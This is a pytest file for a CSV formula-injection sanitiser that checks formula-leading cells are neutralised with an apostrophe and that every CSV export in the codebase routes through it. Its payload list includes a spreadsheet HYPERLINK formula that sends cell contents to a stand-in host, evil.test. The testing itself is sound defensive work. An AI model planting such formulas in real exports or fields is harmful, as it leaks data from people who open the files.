"""CSV formula injection: the cell, and the three exports that write one.

A spreadsheet treats a cell starting with = + - @ as a formula. The dangerous
path here is cross-tenant and the API cannot see it: an agency manager types
their own full name, a bank admin opens the bank's audit export, and the name
executes on the bank's machine as a file rather than arriving as a request.
"""
from __future__ import annotations

import pytest

from app.core.csv_safe import csv_cell, csv_row

PAYLOADS = [
    '=HYPERLINK("https://evil.test?c="&A1,"Click")',
    '+1+1',
    '-1+1',
    '@SUM(A1:A9)',
    '\t=1+1',          # hidden behind a tab
    '\r=1+1',          # and behind a carriage return
]


@pytest.mark.parametrize("payload", PAYLOADS)
def test_a_formula_is_neutralised(payload):
    out = csv_cell(payload)
    assert out.startswith("'"), out
    # The data is kept, not mangled: the apostrophe is display-stripped by
    # every spreadsheet, so the reader still sees what was typed.
    assert out[1:] == payload


@pytest.mark.parametrize("ordinary", ["Meera Khanna", "LOGIN", "", "10.0.0.2", "a=b", "2026-10-07"])
def test_ordinary_text_is_untouched(ordinary):
    """Including a value that merely CONTAINS '=' — only a LEADING formula
    character matters, and quoting more than necessary would corrupt real data."""
    assert csv_cell(ordinary) == ordinary


@pytest.mark.parametrize("value", [None, 0, 1, -5, 3.14, True, False])
def test_non_strings_pass_through_unchanged(value):
    """A number cannot carry a formula, and stringifying it here would change
    the column's type for whoever reads the file."""
    assert csv_cell(value) is value


def test_csv_row_applies_it_across_a_row():
    assert csv_row(["ok", "=1+1", 7, None]) == ["ok", "'=1+1", 7, None]


def test_every_csv_export_in_the_codebase_routes_through_it():
    """A tripwire, not a proof. Three exports shared this gap because the
    sanitiser did not exist; a FOURTH will be written one day, and this fails
    when it writes rows without csv_row. Add to ALLOWED only for a writer whose
    every cell is machine-generated."""
    import pathlib
    import re

    ALLOWED: set[str] = set()
    app_dir = pathlib.Path(__file__).resolve().parents[1] / "app"
    missing = []
    for path in sorted(app_dir.rglob("*.py")):
        text = path.read_text(encoding="utf-8", errors="replace")
        if "csv.writer" not in text:
            continue
        rel = path.relative_to(app_dir).as_posix()
        if rel in ALLOWED:
            continue
        # Every writerow that carries a list literal must wrap it.
        for match in re.finditer(r"\.writerow\(\s*\[", text):
            line = text[:match.start()].count("\n") + 1
            missing.append(f"{rel}:{line}")
    assert missing == [], f"writerow([...]) without csv_row: {missing}"
